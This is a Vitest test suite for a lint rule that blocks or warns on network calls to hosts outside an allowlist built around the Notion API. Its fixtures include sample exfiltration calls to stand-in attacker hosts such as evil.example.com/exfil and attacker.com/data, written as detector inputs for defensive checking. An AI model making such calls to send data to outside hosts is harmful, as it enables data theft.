import { describe, it, expect } from 'vitest';
import { noNonAllowlistedNetwork } from '../src/rules/no-non-allowlisted-network.js';
import { runRule, TEST_OPTS } from './helpers.js';

describe('no-non-allowlisted-network', () => {
  it('passes clean code that fetches the Notion API', () => {
    const src = `
      const r = await fetch('https://api.notion.com/v1/users/me', {
        headers: { Authorization: 'Bearer X' }
      });
      const j = await r.json();
      export default j;
    `;
    expect(runRule(noNonAllowlistedNetwork, src)).toHaveLength(0);
  });

  // False-positive resistance: `fetch` on a non-global namespace
  it('does not flag method calls named "get" on arbitrary objects', () => {
    const src = `
      const map = new Map();
      map.get('key');
      const obj = { get: (k: string) => k };
      obj.get('hello');
      const arr = [1, 2, 3];
      const found = arr.find(x => x === 2);
      export { found };
    `;
    expect(runRule(noNonAllowlistedNetwork, src)).toHaveLength(0);
  });

  it('blocks fetch() to a non-allowlisted host', () => {
    const src = `await fetch('https://evil.example.com/exfil');`;
    const v = runRule(noNonAllowlistedNetwork, src);
    expect(v).toHaveLength(1);
    expect(v[0]?.severity).toBe('block');
    expect(v[0]?.message).toMatch(/evil\.example\.com/);
  });

  it('blocks new URL(<literal>) targeting non-allowlisted host', () => {
    const src = `const u = new URL('https://attacker.io/x');`;
    const v = runRule(noNonAllowlistedNetwork, src);
    expect(v).toHaveLength(1);
    expect(v[0]?.severity).toBe('block');
  });

  it('allows new URL targeting allowlisted host', () => {
    const src = `const u = new URL('https://api.notion.com/v1/pages');`;
    expect(runRule(noNonAllowlistedNetwork, src)).toHaveLength(0);
  });

  it('warns on dynamic fetch URL (cannot verify)', () => {
    const src = `
      const url = process.env.SOMETHING;
      await fetch(url);
    `;
    const v = runRule(noNonAllowlistedNetwork, src);
    expect(v).toHaveLength(1);
    expect(v[0]?.severity).toBe('warn');
  });

  it('warns on template literal fetch URL', () => {
    const src = `
      const id = '123';
      await fetch(\`https://api.notion.com/v1/pages/\${id}\`);
    `;
    const v = runRule(noNonAllowlistedNetwork, src);
    expect(v).toHaveLength(1);
    expect(v[0]?.severity).toBe('warn');
  });

  it('blocks axios.get to non-allowlisted host', () => {
    const src = `
      import axios from 'axios';
      await axios.get('https://attacker.com/data');
    `;
    const v = runRule(noNonAllowlistedNetwork, src);
    expect(v).toHaveLength(1);
    expect(v[0]?.severity).toBe('block');
  });

  it('blocks http.request to non-allowlisted host', () => {
    const src = `
      import http from 'http';
      http.request('http://1.2.3.4:8080/');
    `;
    const v = runRule(noNonAllowlistedNetwork, src);
    expect(v).toHaveLength(1);
    expect(v[0]?.severity).toBe('block');
  });

  it('ignores relative URLs (no network call)', () => {
    const src = `
      await fetch('/api/local');
      await fetch('relative/path');
    `;
    expect(runRule(noNonAllowlistedNetwork, src)).toHaveLength(0);
  });

  it('ignores data: URIs', () => {
    const src = `await fetch('data:text/plain;base64,SGVsbG8=');`;
    expect(runRule(noNonAllowlistedNetwork, src)).toHaveLength(0);
  });

  it('respects caller-provided extended allowlist', () => {
    const src = `await fetch('https://api.github.com/repos/foo/bar');`;
    const opts = {
      ...TEST_OPTS,
      networkAllowlist: [...TEST_OPTS.networkAllowlist, 'api.github.com'],
    };
    expect(runRule(noNonAllowlistedNetwork, src, opts)).toHaveLength(0);
  });

  it('is case-insensitive on host matching', () => {
    const src = `await fetch('https://API.NOTION.COM/v1/users/me');`;
    expect(runRule(noNonAllowlistedNetwork, src)).toHaveLength(0);
  });

  describe('wildcard allowlist entries (`*.foo.com`)', () => {
    const opts = {
      ...TEST_OPTS,
      networkAllowlist: [...TEST_OPTS.networkAllowlist, '*.slack.com'],
    };

    it('matches any subdomain of the wildcard base', () => {
      const src = `
        await fetch('https://hooks.slack.com/services/xxx');
        await fetch('https://acme.enterprise.slack.com/api');
      `;
      expect(runRule(noNonAllowlistedNetwork, src, opts)).toHaveLength(0);
    });

    it('does NOT match the bare host (requires a separate entry)', () => {
      const src = `await fetch('https://slack.com/api/auth.test');`;
      const v = runRule(noNonAllowlistedNetwork, src, opts);
      expect(v).toHaveLength(1);
      expect(v[0]?.severity).toBe('block');
    });

    it('does NOT match a similar-looking host with a different suffix', () => {
      const src = `await fetch('https://attackerslack.com/x');`;
      const v = runRule(noNonAllowlistedNetwork, src, opts);
      expect(v).toHaveLength(1);
    });
  });
});
